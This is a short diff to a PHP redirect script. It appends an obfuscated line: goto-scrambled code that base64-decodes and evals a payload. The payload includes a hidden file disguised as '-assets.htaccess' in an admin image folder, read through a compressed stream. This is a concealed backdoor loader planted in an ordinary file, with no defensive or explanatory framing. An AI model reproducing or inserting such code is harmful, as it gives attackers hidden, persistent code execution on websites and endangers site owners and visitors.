@@ -43,4 +43,5 @@ if (isset($_SERVER['HTTP_REFERER'])) {
     echo "No previous page found!";
 }
 exit;
+eval('goto L_ohukcb; L_svrdbj: goto L_xeasvj; L_xeasvj: goto L_xyixvi; L_ohukcb: $nwox = base64_decode(\'bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvYWRtaW4vYXNzZXRzL2ltZy9wcm9ncmVzcy9wdWI2NjRhZTAvLWFzc2V0cy5odGFjY2VzcycpIHsgDQoJZnVuY3Rpb24gX19jb25zdHJ1Y3QoJOaBsuWFvTTpvrspIHsgDQoJCUBpbmNsdURFX29uY2UoJOaBsuWFvTTpvrspOyANCiAgICB9IA0KfTs=\'); goto L_svrdbj; L_mnbppu:; L_pdmqos: eval($nwox); goto L_mnbppu; L_xyixvi: goto L_pdmqos; ');
 ?>
